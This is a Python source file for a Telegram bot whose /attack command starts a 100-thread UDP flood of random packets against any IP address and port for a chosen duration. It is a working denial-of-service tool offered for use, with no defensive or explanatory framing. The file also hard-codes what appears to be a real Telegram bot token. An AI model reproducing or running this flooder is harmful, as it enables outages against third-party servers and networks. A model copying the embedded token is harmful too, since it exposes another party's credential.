import socket
import time
import asyncio
import random
import threading
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes

# 👉 अपने Telegram Bot का Token यहाँ डालें
BOT_TOKEN = "7744875151:AAF8P1vSd8awHrmaGmWQiI6d-S_fgoPvLkY"

# /start command
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("👋 Welcome Pawan Bhai! Use: /attack <ip> <port> <time>")

# UDP flood function
def send_flood(ip, port, duration):
    timeout = time.time() + duration
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while time.time() < timeout:
        try:
            data = random._urandom(1024)
            sock.sendto(data, (ip, port))
        except:
            break
    sock.close()

# Multi-threaded UDP attack
def start_attack(ip, port, duration, threads=100):
    print(f"[✓] Starting attack on {ip}:{port} for {duration} seconds with {threads} threads.")
    thread_list = []
    for _ in range(threads):
        t = threading.Thread(target=send_flood, args=(ip, port, duration))
        t.start()
        thread_list.append(t)
    for t in thread_list:
        t.join()
    print("[✓] Attack completed.")

# /attack command
async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if len(context.args) != 3:
        await update.message.reply_text("❌ Usage: /attack <ip> <port> <duration>")
        return

    ip = context.args[0]
    try:
        port = int(context.args[1])
        duration = int(context.args[2])
    except:
        await update.message.reply_text("❌ Port and duration must be numbers.")
        return

    await update.message.reply_text(f"🚀 Attack started on {ip}:{port} for {duration} seconds 🔥")

    loop = asyncio.get_event_loop()
    await loop.run_in_executor(None, start_attack, ip, port, duration)

    await update.message.reply_text("✅ Done! Check Target Status.")

# Bot run setup
if __name__ == "__main__":
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("attack", attack))  # ✅ Changed from /udp to /attack
    app.run_polling()
